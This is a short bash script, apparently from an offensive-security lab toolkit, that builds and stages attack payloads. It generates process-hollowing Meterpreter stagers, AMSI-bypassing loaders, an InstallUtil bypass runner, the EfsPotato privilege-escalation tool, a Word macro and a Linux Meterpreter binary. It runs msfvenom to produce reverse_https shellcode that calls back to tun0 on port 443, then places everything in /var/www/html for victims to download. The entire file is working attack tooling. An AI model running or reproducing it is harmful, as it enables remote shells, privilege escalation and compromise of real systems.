#!/bin/bash
set -ex
WEBDIR=/var/www/html

python3 generate_win_msf_stager.py --injection hollow --format exe
python3 generate_win_msf_stager.py --injection hollow --format dll
python3 generate_tool_loader.py --no-amsi metdll > run.txt
python3 generate_tool_loader.py --no-amsi metexe >> run.txt
python3 generate_win_installutil_ps_runner.py
python3 generate_msf_linux_exe.py
python3 generate_win_util_EfsPotato.py
python3 generate_win_util_PSLessExec.py
python3 generate_winword_macro.py

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f raw -o sc
msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f raw -o sc32

sudo mv win_msf_stager.dll ${WEBDIR}/met.dll
sudo mv win_msf_stager.exe ${WEBDIR}/met.exe
sudo mv run.txt ${WEBDIR}/run.txt
sudo mv win_installutil_ps_runner.txt ${WEBDIR}/Bypass.txt
sudo mv msf-linux-x64 ${WEBDIR}/
sudo mv win_pslessexec.exe ${WEBDIR}/tools/PSLessExec.exe
sudo mv win_efspotato.exe ${WEBDIR}/EfsPotato.exe
sudo mv output_efs.txt ${WEBDIR}/efs.txt
sudo mv sc ${WEBDIR}/sc
sudo mv sc32 ${WEBDIR}/sc32
